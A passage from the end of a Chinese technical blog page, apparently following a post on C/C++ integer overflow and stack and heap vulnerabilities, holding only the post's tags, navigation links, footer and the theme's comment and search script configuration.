</span></span></code></pre></td></tr></table></div></div></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 2019-10-09</span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/linux/>Linux</a>,&nbsp;<a href=/tags/c/c++/>C/C++</a>,&nbsp;<a href=/tags/arm/>ARM</a>,&nbsp;<a href=/tags/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/>整数溢出</a>,&nbsp;<a href=/tags/%E6%A0%88%E6%BC%8F%E6%B4%9E/>栈漏洞</a>,&nbsp;<a href=/tags/%E5%A0%86%E6%BC%8F%E6%B4%9E/>堆漏洞</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/ipv6-tunnel/ class=prev rel=prev title="舍近求远：开通 IPv6 隧道"><i class="fas fa-angle-left fa-fw"></i>舍近求远：开通 IPv6 隧道</a>
<a href=/hackergame2019/ class=next rel=next title="Hackergame2019 比赛记录">Hackergame2019 比赛记录<i class="fas fa-angle-right fa-fw"></i></a></div></div><div id=comments><div id=valine class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://valine.js.org/>Valine</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>由 <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.94.0">Hugo</a> 强力驱动 | 主题 - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a></div><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2017 - 2022</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>Mercury</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw"></i>
</a><a href=# id=view-comments class=fixed-button title=查看评论><i class="fas fa-comment fa-fw"></i></a></div><link rel=stylesheet href=/lib/valine/valine.min.css><link rel=stylesheet href=/lib/lightgallery/lightgallery.min.css><link rel=stylesheet href=/lib/katex/katex.min.css><script type=text/javascript src=/lib/valine/Valine.min.js></script><script type=text/javascript src=/lib/smooth-scroll/smooth-scroll.min.js></script><script type=text/javascript src=/lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=/lib/algoliasearch/algoliasearch-lite.umd.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/lightgallery/lightgallery.min.js></script><script type=text/javascript src=/lib/lightgallery/lg-thumbnail.min.js></script><script type=text/javascript src=/lib/lightgallery/lg-zoom.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript src=/lib/katex/katex.min.js></script><script type=text/javascript src=/lib/katex/auto-render.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:30},comment:{valine:{appId:"RkxCznUcvfzFBgfMiMr0BAfd-gzGzoHsz",appKey:"sw2sEPOl4haCAXKUFYiBFMrR",avatar:"mp",el:"#valine",emojiCDN:"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/",emojiMaps:{100:"1f4af.png",alien:"1f47d.png",anger:"1f4a2.png",angry:"1f620.png",anguished:"1f627.png",astonished:"1f632.png",black_heart:"1f5a4.png",blue_heart:"1f499.png",blush:"1f60a.png",bomb:"1f4a3.png",boom:"1f4a5.png",broken_heart:"1f494.png",brown_heart:"1f90e.png",clown_face:"1f921.png",cold_face:"1f976.png",cold_sweat:"1f630.png",confounded:"1f616.png",confused:"1f615.png",cry:"1f622.png",crying_cat_face:"1f63f.png",cupid:"1f498.png",dash:"1f4a8.png",disappointed:"1f61e.png",disappointed_relieved:"1f625.png",dizzy:"1f4ab.png",dizzy_face:"1f635.png",drooling_face:"1f924.png",exploding_head:"1f92f.png",expressionless:"1f611.png",face_vomiting:"1f92e.png",face_with_cowboy_hat:"1f920.png",face_with_hand_over_mouth:"1f92d.png",face_with_head_bandage:"1f915.png",face_with_monocle:"1f9d0.png",face_with_raised_eyebrow:"1f928.png",face_with_rolling_eyes:"1f644.png",face_with_symbols_on_mouth:"1f92c.png",face_with_thermometer:"1f912.png",fearful:"1f628.png",flushed:"1f633.png",frowning:"1f626.png",ghost:"1f47b.png",gift_heart:"1f49d.png",green_heart:"1f49a.png",grimacing:"1f62c.png",grin:"1f601.png",grinning:"1f600.png",hankey:"1f4a9.png",hear_no_evil:"1f649.png",heart:"2764-fe0f.png",heart_decoration:"1f49f.png",heart_eyes:"1f60d.png",heart_eyes_cat:"1f63b.png",heartbeat:"1f493.png",heartpulse:"1f497.png",heavy_heart_exclamation_mark_ornament:"2763-fe0f.png",hole:"1f573-fe0f.png",hot_face:"1f975.png",hugging_face:"1f917.png",hushed:"1f62f.png",imp:"1f47f.png",innocent:"1f607.png",japanese_goblin:"1f47a.png",japanese_ogre:"1f479.png",joy:"1f602.png",joy_cat:"1f639.png",kiss:"1f48b.png",kissing:"1f617.png",kissing_cat:"1f63d.png",kissing_closed_eyes:"1f61a.png",kissing_heart:"1f618.png",kissing_smiling_eyes:"1f619.png",laughing:"1f606.png",left_speech_bubble:"1f5e8-fe0f.png",love_letter:"1f48c.png",lying_face:"1f925.png",mask:"1f637.png",money_mouth_face:"1f911.png",nauseated_face:"1f922.png",nerd_face:"1f913.png",neutral_face:"1f610.png",no_mouth:"1f636.png",open_mouth:"1f62e.png",orange_heart:"1f9e1.png",partying_face:"1f973.png",pensive:"1f614.png",persevere:"1f623.png",pleading_face:"1f97a.png",pouting_cat:"1f63e.png",purple_heart:"1f49c.png",rage:"1f621.png",relaxed:"263a-fe0f.png",relieved:"1f60c.png",revolving_hearts:"1f49e.png",right_anger_bubble:"1f5ef-fe0f.png",robot_face:"1f916.png",rolling_on_the_floor_laughing:"1f923.png",scream:"1f631.png",scream_cat:"1f640.png",see_no_evil:"1f648.png",shushing_face:"1f92b.png",skull:"1f480.png",skull_and_crossbones:"2620-fe0f.png",sleeping:"1f634.png",sleepy:"1f62a.png",slightly_frowning_face:"1f641.png",slightly_smiling_face:"1f642.png",smile:"1f604.png",smile_cat:"1f638.png",smiley:"1f603.png",smiley_cat:"1f63a.png",smiling_face_with_3_hearts:"1f970.png",smiling_imp:"1f608.png",smirk:"1f60f.png",smirk_cat:"1f63c.png",sneezing_face:"1f927.png",sob:"1f62d.png",space_invader:"1f47e.png",sparkling_heart:"1f496.png",speak_no_evil:"1f64a.png",speech_balloon:"1f4ac.png","star-struck":"1f929.png",stuck_out_tongue:"1f61b.png",stuck_out_tongue_closed_eyes:"1f61d.png",stuck_out_tongue_winking_eye:"1f61c.png",sunglasses:"1f60e.png",sweat:"1f613.png",sweat_drops:"1f4a6.png",sweat_smile:"1f605.png",thinking_face:"1f914.png",thought_balloon:"1f4ad.png",tired_face:"1f62b.png",triumph:"1f624.png",two_hearts:"1f495.png",unamused:"1f612.png",upside_down_face:"1f643.png",weary:"1f629.png",white_frowning_face:"2639-fe0f.png",white_heart:"1f90d.png",wink:"1f609.png",woozy_face:"1f974.png",worried:"1f61f.png",yawning_face:"1f971.png",yellow_heart:"1f49b.png",yum:"1f60b.png",zany_face:"1f92a.png",zipper_mouth_face:"1f910.png",zzz:"1f4a4.png"},enableQQ:!1,highlight:!0,lang:"zh-cn",pageSize:10,placeholder:"你的评论 ...",recordIP:!1,visitor:!0}},lightGallery:{actualSize:!1,exThumbImage:"data-thumbnail",hideBarsDelay:2e3,selector:".lightgallery",speed:400,thumbContHeight:80,thumbWidth:80,thumbnail:!0},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{algoliaAppID:"P149SBLX5U",algoliaIndex:"blog",algoliaSearchKey:"cbd5db1f3910ee11bc18688f21b64bd4",highlightTag:"em",maxResultLength:10,noResultsFound:"没有找到结果",snippetLength:50,type:"algolia"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>